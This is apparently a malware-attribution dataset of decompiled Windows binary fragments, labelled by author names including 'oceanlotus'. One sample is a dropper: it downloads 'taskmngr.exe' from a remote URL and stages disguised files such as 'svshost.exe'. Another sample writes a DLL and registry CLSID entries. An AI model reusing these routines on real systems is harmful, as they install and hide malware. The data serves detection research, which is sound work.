{"author": "sig45", "label": 0, "inputs": "// attributes: thunk\nint DllFunctionCall()\n{\n  return __imp_DllFunctionCall();\n}\n// attributes: thunk\nint EVENT_SINK_QueryInterface()\n{\n  return __imp_EVENT_SINK_QueryInterface();\n}\n// attributes: thunk\nint EVENT_SINK_AddRef()\n{\n  return __imp_EVENT_SINK_AddRef();\n}\n// attributes: thunk\nint EVENT_SINK_Release()\n{\n  return __imp_EVENT_SINK_Release();\n}\n// attributes: thunk\nint Zombie_GetTypeInfoCount()\n{\n  return __imp_Zombie_GetTypeInfoCount();\n}\n// attributes: thunk\nint Zombie_GetTypeInfo()\n{\n  return __imp_Zombie_GetTypeInfo();\n}\n// attributes: thunk\nint EVENT_SINK_GetIDsOfNames()\n{\n  return __imp_EVENT_SINK_GetIDsOfNames();\n}\n// attributes: thunk\nint EVENT_SINK_Invoke()\n{\n  return __imp_EVENT_SINK_Invoke();\n}\n// attributes: thunk\nint __stdcall GetMemEvent(int a1, int a2, int a3, int a4)\n{\n  return __imp_GetMemEvent(a1, a2, a3, a4);\n}\n// attributes: thunk\nint __stdcall PutMemEvent(int a1, int a2, int a3, int a4)\n{\n  return __imp_PutMemEvent(a1, a2, a3, a4);\n}\n// attributes: thunk\nint __stdcall SetMemEvent(int a1, int a2, int a3, int a4)\n{\n  return __imp_SetMemEvent(a1, a2, a3, a4);\n}\n// attributes: thunk\nint MethCallEngine()\n{\n  return __imp_MethCallEngine();\n}\n// attributes: thunk\nint ProcCallEngine()\n{\n  return __imp_ProcCallEngine();\n}\n// attributes: thunk\nint ThunRTMain()\n{\n  return __imp_ThunRTMain();\n}\nint sub_401F02()\n{\n  return MethCallEngine();\n}\nint sub_401F16()\n{\n  return MethCallEngine();\n}\n"}
{"author": "sig45", "label": 0, "inputs": "int sub_401000()\n{\n  return CWinApp::messageMap;\n}\nint (**sub_40100A())()\n{\n  return &off_4AB470;\n}\nCWinApp *__thiscall sub_40101A(CWinApp *this)\n{\n  CWinApp::CWinApp(this, 0);\n  *(_DWORD *)this = &off_4AB4A8;\n  return this;\n}\n// MFC 3.1-14.0 32bit\nint unknown_libname_8()\n{\n  sub_40104A();\n  return sub_401059();\n}\nCWinApp *sub_40104A()\n{\n  return sub_40101A((CWinApp *)dword_516488);\n}\nint sub_401059()\n{\n  return atexit(sub_40106B);\n}\nvoid __cdecl sub_40106B()\n{\n  sub_401140(dword_516488);\n}\nint __thiscall sub_40107A(CWinApp *this)\n{\n  char v3[1476]; // [esp+8h] [ebp-5D4h] BYREF\n  int v4; // [esp+5CCh] [ebp-10h]\n  int v5; // [esp+5D8h] [ebp-4h]\n\n  CWinApp::Enable3dControls(this);\n  sub_4A5513(0);\n  v5 = 0;\n  *((_DWORD *)this + 8) = v3;\n  v4 = CDialog::DoModal((CDialog *)v3);\n  v5 = -1;\n  sub_401160(v3);\n  return 0;\n}\nvoid *__thiscall sub_401110(void *this, char a2)\n{\n  sub_401140(this);\n  if ( (a2 & 1) != 0 )\n    sub_4012E0(this);\n  return this;\n}\nvoid __thiscall sub_401140(CWinApp *this)\n{\n  CWinApp::~CWinApp(this);\n}\nvoid __thiscall sub_401160(int this)\n{\n  CStatic::~CStatic((CStatic *)(this + 1408));\n  CStatic::~CStatic((CStatic *)(this + 1344));\n  CStatic::~CStatic((CStatic *)(this + 1280));\n  CStatic::~CStatic((CStatic *)(this + 1216));\n  CStatic::~CStatic((CStatic *)(this + 1152));\n  CStatic::~CStatic((CStatic *)(this + 1088));\n  CStatic::~CStatic((CStatic *)(this + 1024));\n  CListBox::~CListBox((CListBox *)(this + 960));\n  CStatic::~CStatic((CStatic *)(this + 896));\n  CAnimateCtrl::~CAnimateCtrl((CAnimateCtrl *)(this + 832));\n  CStatic::~CStatic((CStatic *)(this + 768));\n  CButton::~CButton((CButton *)(this + 704));\n  CButton::~CButton((CButton *)(this + 640));\n  CStatic::~CStatic((CStatic *)(this + 576));\n  CStatic::~CStatic((CStatic *)(this + 512));\n  CButton::~CButton((CButton *)(this + 448));\n  CStatic::~CStatic((CStatic *)(this + 384));\n  CDialog::~CDialog((CDialog *)this);\n}\n// Microsoft VisualC 2-14/net runtime\n// MFC 3.1-14.0 32bit\nvoid __stdcall unknown_libname_9(int a1)\n{\n  ;\n}\nvoid __stdcall sub_"}
{"author": "sig45", "label": 0, "inputs": "// attributes: thunk\nBOOL __stdcall CloseHandle(HANDLE hObject)\n{\n  return __imp_CloseHandle(hObject);\n}\n// attributes: thunk\nHANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)\n{\n  return __imp_CreateFileA(\n           lpFileName,\n           dwDesiredAccess,\n           dwShareMode,\n           lpSecurityAttributes,\n           dwCreationDisposition,\n           dwFlagsAndAttributes,\n           hTemplateFile);\n}\n// attributes: thunk\nDWORD __stdcall GetFileType(HANDLE hFile)\n{\n  return __imp_GetFileType(hFile);\n}\n// attributes: thunk\nDWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)\n{\n  return __imp_GetFileSize(hFile, lpFileSizeHigh);\n}\n// attributes: thunk\nHANDLE __stdcall GetStdHandle(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nBOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)\n{\n  return __imp_ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nBOOL __stdcall SetEndOfFile(HANDLE hFile)\n{\n  return __imp_SetEndOfFile(hFile);\n}\n// attributes: thunk\nDWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)\n{\n  return __imp_SetFilePointer(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);\n}\n// attributes: thunk\nLONG __stdcall UnhandledExceptionFilte"}
{"author": "sig45", "label": 0, "inputs": "int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  __time32_t v4; // eax\n  CHAR v6[256]; // [esp+0h] [ebp-920Ch] BYREF\n  CHAR v7[256]; // [esp+100h] [ebp-910Ch] BYREF\n  char v8[256]; // [esp+200h] [ebp-900Ch] BYREF\n  CHAR v9[256]; // [esp+300h] [ebp-8F0Ch] BYREF\n  CHAR v10[256]; // [esp+400h] [ebp-8E0Ch] BYREF\n  CHAR Destination[256]; // [esp+500h] [ebp-8D0Ch] BYREF\n  CHAR v12[256]; // [esp+600h] [ebp-8C0Ch] BYREF\n  CHAR Buffer[32768]; // [esp+700h] [ebp-8B0Ch] BYREF\n  CHAR File[256]; // [esp+8700h] [ebp-B0Ch] BYREF\n  CHAR Filename[260]; // [esp+8800h] [ebp-A0Ch] BYREF\n  char v16[256]; // [esp+8904h] [ebp-908h] BYREF\n  char v17[256]; // [esp+8A04h] [ebp-808h] BYREF\n  CHAR v18[256]; // [esp+8B04h] [ebp-708h] BYREF\n  CHAR v19[256]; // [esp+8C04h] [ebp-608h] BYREF\n  CHAR v20[256]; // [esp+8D04h] [ebp-508h] BYREF\n  CHAR v21[256]; // [esp+8E04h] [ebp-408h] BYREF\n  CHAR NewFileName[256]; // [esp+8F04h] [ebp-308h] BYREF\n  CHAR ExistingFileName[256]; // [esp+9004h] [ebp-208h] BYREF\n  char v24[256]; // [esp+9104h] [ebp-108h] BYREF\n  CHAR LCData[8]; // [esp+9204h] [ebp-8h] BYREF\n\n  v4 = time(0);\n  sub_402570(v4);\n  GetModuleFileNameA(0, Filename, 0x104u);\n  if ( sub_401C0F(Filename) <= 1 )\n  {\n    GetLocaleInfoA(0x800u, 0x5Au, LCData, 2);\n    if ( GetWindowsDirectoryA(Buffer, 0x8000u) )\n    {\n      strcpy(File, Buffer);\n      strcat(File, Source);\n      strcat(File, (const char *)String);\n      strcpy(Destination, Buffer);\n      strcat(Destination, asc_409110);\n      strcat(Destination, aTaskmngrExe);\n      if ( !fopen(Destination, Mode) )\n        URLDownloadToFileA(0, aHttpW12BizV6Fi, Destination, 0, 0);\n      strcpy(NewFileName, Buffer);\n      strcat(NewFileName, asc_409138);\n      strcat(NewFileName, aMsiauDll);\n      strcpy(v12, Buffer);\n      strcat(v12, asc_40913C);\n      strcat(v12, (const char *)aStisvsqExe);\n      strcpy(v18, Buffer);\n      strcat(v18, asc_409140);\n      strcat(v18, (const char *)aSvshostExe);\n      strcpy(v19, Buffer);\n      strcat(v19, asc_4091"}
{"author": "sig45", "label": 0, "inputs": "// attributes: thunk\nBOOL __stdcall CloseHandle_0(HANDLE hObject)\n{\n  return __imp_CloseHandle_0(hObject);\n}\n// attributes: thunk\nHANDLE __stdcall CreateFileA_0(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)\n{\n  return __imp_CreateFileA_0(\n           lpFileName,\n           dwDesiredAccess,\n           dwShareMode,\n           lpSecurityAttributes,\n           dwCreationDisposition,\n           dwFlagsAndAttributes,\n           hTemplateFile);\n}\n// attributes: thunk\nDWORD __stdcall GetFileType(HANDLE hFile)\n{\n  return __imp_GetFileType(hFile);\n}\n// attributes: thunk\nDWORD __stdcall GetFileSize_0(HANDLE hFile, LPDWORD lpFileSizeHigh)\n{\n  return __imp_GetFileSize_0(hFile, lpFileSizeHigh);\n}\n// attributes: thunk\nHANDLE __stdcall GetStdHandle_0(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle_0(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException_0(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException_0(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nBOOL __stdcall ReadFile_0_0(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)\n{\n  return ReadFile_0(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nBOOL __stdcall SetEndOfFile_0(HANDLE hFile)\n{\n  return __imp_SetEndOfFile_0(hFile);\n}\n// attributes: thunk\nDWORD __stdcall SetFilePointer_0(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)\n{\n  return __imp_SetFilePointer_0(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);\n}\n// attributes: thunk\nLONG __std"}
{"author": "sig45", "label": 0, "inputs": "INT_PTR __stdcall sub_401010(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n\n  sub_405460(0, 0, aGetpassword1, lpString);\n  if ( a2 == 272 )\n  {\n    SetDlgItemTextA(hDlg, 102, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    if ( (_WORD)a3 == 1 )\n    {\n      GetDlgItemTextA(hDlg, 101, String, 128);\n      EndDialog(hDlg, 1);\n      result = 1;\n    }\n    else if ( (_WORD)a3 == 2 )\n    {\n      EndDialog(hDlg, 0);\n      result = 1;\n    }\n    else\n    {\n      result = 0;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_4010A3(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n  int v5; // [esp-4h] [ebp-10h]\n\n  sub_405460(0, 0, aAsknextvol, lpString);\n  if ( a2 == 272 )\n  {\n    ::lpString = (LPCSTR)lpString;\n    SetDlgItemTextA(hDlg, 101, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    switch ( (_WORD)a3 )\n    {\n      case 1:\n        GetDlgItemTextA(hDlg, 101, (LPSTR)::lpString, 1024);\n        EndDialog(hDlg, 1);\n        result = 1;\n        break;\n      case 2:\n        EndDialog(hDlg, 0);\n        result = 1;\n        break;\n      case 0x66:\n        v5 = sub_405C60();\n        sub_402A00();\n        if ( (unsigned __int8)sub_405520(v5) )\n          SetDlgItemTextA(hDlg, 101, ::lpString);\n        result = 1;\n        break;\n      default:\n        result = 0;\n        break;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_401183(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  HWND v4; // esi\n  HWND v5; // eax\n  HWND v6; // edi\n  LRESULT v7; // eax\n  int i; // edi\n  const CHAR *v9; // eax\n  HWND v10; // eax\n  HWND v11; // esi\n  const char *v12; // eax\n  const CHAR *v13; // eax\n  int v14; // ecx\n  const CHAR *v15; // eax\n  const CHAR *v16; // eax\n  INT_PTR result; // eax\n  const CHAR *v18; // [esp-14h] [ebp-2E28h]\n  CHAR Text[512]; // [esp+0h] [ebp-2E14h] BYREF\n  CHAR PathName[1024]; // [esp+200h] [ebp-2C14h] BYREF\n  CHAR String[1024]; // [esp+600h] [ebp-2814h] BYREF\n  in"}
{"author": "sig45", "label": 0, "inputs": "// attributes: thunk\nBOOL __stdcall CloseHandle(HANDLE hObject)\n{\n  return __imp_CloseHandle(hObject);\n}\n// attributes: thunk\nHANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)\n{\n  return __imp_CreateFileA(\n           lpFileName,\n           dwDesiredAccess,\n           dwShareMode,\n           lpSecurityAttributes,\n           dwCreationDisposition,\n           dwFlagsAndAttributes,\n           hTemplateFile);\n}\n// attributes: thunk\nDWORD __stdcall GetFileType(HANDLE hFile)\n{\n  return __imp_GetFileType(hFile);\n}\n// attributes: thunk\nDWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)\n{\n  return __imp_GetFileSize(hFile, lpFileSizeHigh);\n}\n// attributes: thunk\nHANDLE __stdcall GetStdHandle(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nBOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)\n{\n  return __imp_ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nBOOL __stdcall SetEndOfFile(HANDLE hFile)\n{\n  return __imp_SetEndOfFile(hFile);\n}\n// attributes: thunk\nDWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)\n{\n  return __imp_SetFilePointer(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);\n}\n// attributes: thunk\nLONG __stdcall UnhandledExceptionFilte"}
{"author": "sig45", "label": 0, "inputs": "// attributes: thunk\nint sub_131414FE()\n{\n  return MEMORY[0x10002000]();\n}\n// attributes: thunk\nint sub_13141504()\n{\n  return MEMORY[0x10002004]();\n}\n// attributes: thunk\nint sub_1314150A()\n{\n  return MEMORY[0x10002008]();\n}\n// attributes: thunk\nint sub_13141510()\n{\n  return MEMORY[0x1000200C]();\n}\n// attributes: thunk\nint sub_13141516()\n{\n  return MEMORY[0x10002010]();\n}\n// attributes: thunk\nint sub_1314151C()\n{\n  return MEMORY[0x10002014]();\n}\n// attributes: thunk\nint sub_13141522()\n{\n  return MEMORY[0x10002018]();\n}\n// attributes: thunk\nint sub_13141528()\n{\n  return MEMORY[0x1000201C]();\n}\nvoid __stdcall sub_13146CD4(_BYTE *a1, int a2)\n{\n  do\n  {\n    *a1++ = 0;\n    --a2;\n  }\n  while ( a2 );\n}\nint sub_13146CE9()\n{\n  int result; // eax\n  char v1[4]; // [esp+0h] [ebp-8h] BYREF\n  int v2; // [esp+4h] [ebp-4h]\n\n  sub_13146FBA(dword_13146FEC, 1024);\n  sub_13146FD2(dword_13146FEC, asc_13146C64);\n  sub_13146FD2(dword_13146FEC, aSsmcDll);\n  v2 = sub_13146FAE(dword_13146FEC, -1073741824, 3, 0, 2, 0, 0);\n  result = v2 + 1;\n  if ( v2 != -1 )\n  {\n    sub_13146FCC(v2, dword_13141054, 23552, v1, 0);\n    result = sub_13146FA8(v2);\n  }\n  return result;\n}\nint sub_13146D5D()\n{\n  int v0; // edi\n  int result; // eax\n\n  sub_13146CD4(dword_131473F4, 6666);\n  sub_13146CD4(&word_13148E02, 6666);\n  if ( !sub_13146F9C(&byte_13146CC3) )\n  {\n    dword_131473EC = (int)&word_13148E02;\n    if ( !sub_13146FA2(&byte_13146CC3, &dword_131473EC) )\n    {\n      dword_131473F0 = 0;\n      v0 = dword_131473EC;\n      do\n      {\n        sub_13146FD2(dword_131473F4, v0);\n        v0 += 2;\n        ++dword_131473F0;\n      }\n      while ( dword_131473F0 != 38 );\n    }\n  }\n  sub_13146CD4(&word_13148E02, 6670);\n  sub_13146F8A(-2147483646, aSoftwareMicros, &dword_1314A810);\n  dword_131473EC = 1000;\n  dword_131473F0 = 1;\n  sub_13146F90(dword_1314A810, aSystem, 0, &dword_131473F0, &word_13148E02, &dword_131473EC);\n  if ( (unsigned int)sub_13146FDE(&word_13148E02) < 0x26 )\n  {\n    sub_13146FD8(&word_13148E02, aClsid);\n    sub_13146FD2(&word_13148E02, dword_131473F4"}
{"author": "sig45", "label": 0, "inputs": "// attributes: thunk\nint _vbaChkstk()\n{\n  return __vbaChkstk();\n}\n// attributes: thunk\nint _vbaExceptHandler()\n{\n  return __vbaExceptHandler();\n}\n// attributes: thunk\nvoid __noreturn _vbaFPException()\n{\n  __vbaFPException();\n}\n// attributes: thunk\nint __stdcall adj_fdiv_m64(int a1, int a2)\n{\n  return _adj_fdiv_m64(a1, a2);\n}\n// attributes: thunk\nint DllFunctionCall()\n{\n  return __imp_DllFunctionCall();\n}\n// attributes: thunk\nint EVENT_SINK_QueryInterface()\n{\n  return __imp_EVENT_SINK_QueryInterface();\n}\n// attributes: thunk\nint EVENT_SINK_AddRef()\n{\n  return __imp_EVENT_SINK_AddRef();\n}\n// attributes: thunk\nint EVENT_SINK_Release()\n{\n  return __imp_EVENT_SINK_Release();\n}\n// attributes: thunk\nint __stdcall GetMemStr(int a1, int a2)\n{\n  return __imp_GetMemStr(a1, a2);\n}\n// attributes: thunk\nint __stdcall PutMemStr(int a1, int a2)\n{\n  return __imp_PutMemStr(a1, a2);\n}\n// attributes: thunk\nint __stdcall GetMem4(int a1, int a2)\n{\n  return __imp_GetMem4(a1, a2);\n}\n// attributes: thunk\nint __stdcall PutMem4(int a1, int a2)\n{\n  return __imp_PutMem4(a1, a2);\n}\n// attributes: thunk\nint ThunRTMain()\n{\n  return __imp_ThunRTMain();\n}\nint __stdcall sub_403860(int a1)\n{\n  return sub_4255A0(a1 - 371);\n}\nint __stdcall sub_403B74(int a1)\n{\n  return sub_426BF0(a1 - 55);\n}\nint __stdcall sub_403F70(int a1)\n{\n  return sub_425BE0(a1 - 59);\n}\nint __stdcall sub_403F7D(int a1)\n{\n  return sub_425CA0(a1 - 67);\n}\nint __stdcall sub_403FA4(int a1)\n{\n  return sub_4263D0(a1 - 71);\n}\nint __stdcall sub_4049E9(int a1)\n{\n  return sub_413A70(a1 - 123);\n}\nint __cdecl sub_404A03(int a1)\n{\n  return sub_413E90(a1 - 119);\n}\nint __stdcall sub_404A10(int a1)\n{\n  return sub_414680(a1 - 151);\n}\nint nullsub_1()\n{\n  void *retaddr[2]; // [esp+0h] [ebp+0h]\n\n  return MK_FP(retaddr[0], retaddr[0])();\n}\nint sub_4054A4()\n{\n  int (*v1)(void); // eax\n\n  if ( dword_428ABC )\n    return dword_428ABC();\n  v1 = (int (*)(void))DllFunctionCall();\n  return v1();\n}\nint sub_40555C()\n{\n  int (*v1)(void); // eax\n\n  if ( dword_428AD4 )\n    return dword_428AD4();\n  v1 = (int (*)(vo"}
{"author": "sig45", "label": 0, "inputs": "char *sub_401000()\n{\n  char *result; // eax\n  int (__stdcall *v1)(int); // esi\n  bool v2; // zf\n\n  result = dword_4A52C4;\n  if ( !dword_4A52C4 )\n  {\n    v1 = *(int (__stdcall **)(int))IsClipboardFormatAvailable;\n    if ( IsClipboardFormatAvailable(1u) )\n    {\n      v2 = sub_403C10(0, (int)&hMem) == -1;\n      result = Src;\n      if ( !v2 )\n        result = (char *)lpWideCharStr;\n    }\n    else\n    {\n      v2 = v1(15) == 0;\n      result = asc_4927EC;\n      if ( v2 )\n        result = Src;\n    }\n  }\n  return result;\n}\nchar *__usercall sub_401050@<eax>(char *a1@<edi>, __int64 Value)\n{\n  unsigned int v2; // ecx\n  int v4; // eax\n  char *v5; // esi\n  char *v6; // esi\n\n  v2 = HIDWORD(Value);\n  if ( *(_BYTE *)(off_49F440 + 209) == 68 )\n    return _i64toa(Value, a1, 10);\n  v4 = Value;\n  v5 = a1;\n  if ( Value < 0 )\n  {\n    v4 = -(int)Value;\n    *a1 = 45;\n    v5 = a1 + 1;\n    v2 = (unsigned __int64)-Value >> 32;\n  }\n  *(_WORD *)v5 = 30768;\n  v6 = v5 + 2;\n  _i64toa(__SPAIR64__(v2, v4), v6, 16);\n  if ( *(_BYTE *)(off_49F440 + 209) == 72 )\n    CharUpperA(v6);\n  return a1;\n}\nchar __userpurge sub_4010D0@<al>(int a1@<eax>, int a2, int a3, char a4)\n{\n  _DWORD *v4; // esi\n  char v5; // al\n  char result; // al\n\n  v4 = (_DWORD *)a1;\n  if ( !*(_BYTE *)(a1 + 23) )\n    v4 = *(_DWORD **)(a1 + 12);\n  v5 = *((_BYTE *)v4 + 21);\n  if ( (v5 & 2) != 0 )\n  {\n    *((_BYTE *)v4 + 21) = v5 & 0x3D;\n    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*v4 + 8))(*v4);\n  }\n  *v4 = a2;\n  result = a4 | *((_BYTE *)v4 + 21) & 0x8B;\n  v4[1] = a3;\n  *((_BYTE *)v4 + 21) = result;\n  if ( result >= 0 )\n  {\n    if ( (dword_4A2D8C && (result & 0x10) != 0 || dword_4A2D90 && (result & 0x20) != 0) && (result & 8) != 0 )\n      result = sub_401150();\n  }\n  else\n  {\n    result = sub_401150();\n    *((_BYTE *)v4 + 21) &= 0x8Fu;\n  }\n  return result;\n}\nchar __usercall sub_401150@<al>(int a1@<eax>)\n{\n  int v1; // ebx\n  char result; // al\n  char *v3; // eax\n  size_t v4; // eax\n  char Src[256]; // [esp+48h] [ebp-100h] BYREF\n\n  v1 = a1;\n  if ( !*(_BYTE *)(a1 + 23) )\n    v1 = *(_DWORD"}
{"author": "oceanlotus", "label": 1, "inputs": "int __cdecl sub_401000(unsigned int a1)\n{\n  int v1; // edi\n  HMODULE v2; // eax\n  HMODULE v3; // ebx\n  char *v4; // eax\n  unsigned int v5; // ecx\n  int v7; // [esp+14h] [ebp-1Ch]\n\n  v7 = -1;\n  v1 = 0;\n  v2 = GetModuleHandleW(0);\n  v3 = v2;\n  if ( v2 )\n  {\n    v4 = (char *)v2 + *((_DWORD *)v2 + 15);\n    if ( *(_DWORD *)v4 == 17744 )\n    {\n      while ( v1 < *((unsigned __int16 *)v4 + 3) )\n      {\n        v5 = (unsigned int)v3 + *(_DWORD *)&v4[40 * v1 + 260];\n        if ( a1 < v5 + *(_DWORD *)&v4[40 * v1 + 256] && a1 >= v5 )\n          return a1 + *(_DWORD *)&v4[40 * v1 + 268] - v5;\n        ++v1;\n      }\n    }\n  }\n  return v7;\n}\nint sub_4010C0()\n{\n  int v0; // ecx\n  char v1; // al\n  char v2; // al\n  _DWORD *v3; // ecx\n  int i; // edx\n  char v5; // cl\n  char v6; // al\n  char v7; // cl\n  char v8; // al\n  char v9; // cl\n  char v10; // al\n  int v11; // eax\n  int j; // ecx\n  int v13; // esi\n  int v14; // eax\n  int v15; // eax\n  int v16; // eax\n  unsigned __int8 v17; // al\n  int v18; // esi\n  int v19; // ebx\n  int v20; // edi\n  int v21; // eax\n  int v22; // edx\n  int v23; // eax\n  int v24; // eax\n  int v25; // eax\n  int result; // eax\n  char v27[255]; // [esp+10h] [ebp-204h]\n  char v28[257]; // [esp+10Fh] [ebp-105h]\n\n  v0 = 0;\n  v1 = 1;\n  do\n  {\n    v28[(unsigned __int8)v1 + 1] = v0;\n    v27[v0++] = v1;\n    v1 ^= (2 * v1) ^ (v1 < 0 ? 0x1B : 0);\n  }\n  while ( v0 < 256 );\n  v2 = 1;\n  v3 = &unk_4678A0;\n  do\n  {\n    *v3++ = (unsigned __int8)v2 << 24;\n    v2 = (v2 < 0 ? 0x1B : 0) ^ (2 * v2);\n  }\n  while ( (int)v3 < (int)&unk_4678C8 );\n  dword_466CA0[0] = 99;\n  dword_469E6C = 0;\n  for ( i = 1; i < 256; ++i )\n  {\n    v5 = v28[-(unsigned __int8)v28[i + 1]];\n    v6 = __ROL1__(v5, 1);\n    v7 = v6 ^ v5;\n    v8 = __ROL1__(v6, 1);\n    v9 = v8 ^ v7;\n    v10 = __ROL1__(v8, 1);\n    v11 = (unsigned __int8)(v10 ^ v9 ^ __ROL1__(v10, 1)) ^ 0x63;\n    dword_466CA0[i] = v11;\n    dword_469CE0[v11] = i;\n  }\n  for ( j = 0; j < 256; ++j )\n  {\n    v13 = (unsigned __int8)((2 * LOBYTE(dword_466CA0[j])) ^ (SLOBYTE(dword_466CA0[j]) < 0 ? 0x1B : 0));\n   "}
{"author": "oceanlotus", "label": 1, "inputs": "int __thiscall sub_401000(_DWORD *this)\n{\n  *this = &std::bad_alloc::`vftable';\n  return sub_4164D5();\n}\nvoid *__thiscall sub_401010(void *this, char a2)\n{\n  *(_DWORD *)this = &std::bad_alloc::`vftable';\n  sub_4164D5();\n  if ( (a2 & 1) != 0 )\n    operator delete(this);\n  return this;\n}\n// attributes: thunk\nint sub_401040()\n{\n  return sub_4164D5();\n}\nvoid __usercall sub_401050(int _EAX@<eax>, int a2@<ecx>)\n{\n  unsigned int v2; // kr00_4\n  int v7; // eax\n  int v8; // [esp+18h] [ebp-8h] BYREF\n\n  LOWORD(_EAX) = (char)_EAX;\n  v2 = __readeflags();\n  __asm\n  {\n    aas\n    aad\n  }\n  LOWORD(_EAX) = 8 * (char)_EAX;\n  __asm\n  {\n    aaa\n    aam\n  }\n  __writeeflags(v2);\n  v8 = a2;\n  std::_Lockit::_Lockit((std::_Lockit *)&v8, 0);\n  v7 = *(_DWORD *)(a2 + 4);\n  if ( v7 != -1 )\n    *(_DWORD *)(a2 + 4) = v7 + 1;\n  std::_Lockit::~_Lockit((std::_Lockit *)&v8);\n}\nint __usercall sub_401100@<eax>(int _EAX@<eax>, __int16 a2@<dx>, int a3@<ecx>, __int16 a4@<bx>)\n{\n  unsigned int v4; // kr00_4\n  unsigned __int32 v7; // eax\n  int v12; // eax\n  int v13; // esi\n  char v15[4]; // [esp+58h] [ebp-4h] BYREF\n\n  v4 = __readeflags();\n  __asm\n  {\n    aas\n    aam\n  }\n  LOWORD(_EAX) = (char)_EAX;\n  v7 = _byteswap_ulong(_EAX);\n  BYTE1(v7) = -BYTE1(v7);\n  _EAX = ~v7;\n  __asm\n  {\n    das\n    aas\n    das\n  }\n  _BitScanForward((unsigned __int16 *)&_EAX, a2 ^ a4 ^ 0x40);\n  __asm { aaa }\n  LOBYTE(_EAX) = ~(_BYTE)_EAX;\n  __asm\n  {\n    aam\n    daa\n    aaa\n  }\n  __writeeflags(v4);\n  std::_Lockit::_Lockit((std::_Lockit *)v15, 0);\n  v12 = *(_DWORD *)(a3 + 4);\n  if ( v12 && v12 != -1 )\n    *(_DWORD *)(a3 + 4) = v12 - 1;\n  v13 = *(_DWORD *)(a3 + 4) == 0 ? a3 : 0;\n  std::_Lockit::~_Lockit((std::_Lockit *)v15);\n  return v13;\n}\nint __usercall sub_4011C0@<eax>(int result@<eax>, 